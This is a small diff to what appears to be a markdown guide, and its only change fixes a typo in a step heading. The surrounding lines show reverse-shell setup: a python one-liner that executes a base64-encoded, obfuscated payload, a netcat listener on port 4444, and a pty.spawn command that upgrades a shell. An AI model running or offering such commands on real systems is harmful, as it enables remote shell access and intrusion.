@@ -9,7 +9,7 @@ python -c 'import base64;exec(base64.b64decode("IAppbXBvcnQgc3VicHJvY2VzcwppbXBv
 ```bash 
 nc 127.0.0.1 4444
 ```
-3.Run the fallowing command on terminal 
+3.Run the following command on terminal 
 
 ```bash 
 python -c 'import pty; pty.spawn("/bin/bash")'
